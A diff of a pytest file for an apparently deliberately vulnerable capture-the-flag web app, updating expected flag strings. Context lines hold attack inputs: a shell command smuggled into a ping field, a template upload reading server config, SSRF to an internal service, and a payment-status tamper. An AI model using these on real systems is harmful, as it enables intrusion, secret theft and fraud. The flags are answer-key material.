@@ -50,7 +50,7 @@ def test_command_injection_reads_planted_flag(app):
     else:
         payload = f"127.0.0.1; cat '{flag_path}'"
     body = client.post("/admin/tools/ping", data={"host": payload}).data
-    assert b"MFANO{semicolon_reached_the_shell}" in body
+    assert b"MFANO{s3m1c0l0n_r34ch3d_th3_sh3ll}" in body
 
 
 def test_upload_accepts_any_file_and_executes_it(app):
@@ -62,7 +62,7 @@ def test_upload_accepts_any_file_and_executes_it(app):
     data = {"file": (io.BytesIO(b"{{ config['SERVER_FLAG'] }}"), "evil.html")}
     client.post("/admin/tools/upload", data=data, content_type="multipart/form-data")
     body = client.get("/admin/tools/preview", query_string={"name": "evil.html"}).data
-    assert b"MFANO{uploaded_script_ran_on_the_server}" in body
+    assert b"MFANO{upl04d3d_scr1pt_r4n_0n_th3_s3rv3r}" in body
 
 
 def test_ssrf_reaches_internal_grading_service(app, grading_server):
@@ -70,7 +70,7 @@ def test_ssrf_reaches_internal_grading_service(app, grading_server):
     login(client)
     target = grading_server + "/internal/logo-config"
     body = client.post("/admin/tools/import-logo", data={"url": target}).data
-    assert b"MFANO{ssrf_reached_the_grading_service}" in body
+    assert b"MFANO{ssrf_r34ch3d_th3_gr4d1ng_s3rv1c3}" in body
 
 
 def test_payment_tamper_clears_balance_without_paying(app):
@@ -83,4 +83,4 @@ def test_payment_tamper_clears_balance_without_paying(app):
     resp = client.post("/payments/pay", data={"amount": balance, "status": "COMPLETED"})
     body = resp.get_json()
     assert body["balance"] == 0
-    assert body["flag"] == "MFANO{paid_nothing_fees_cleared}"
+    assert body["flag"] == "MFANO{p41d_n0th1ng_f33s_cl34r3d}"
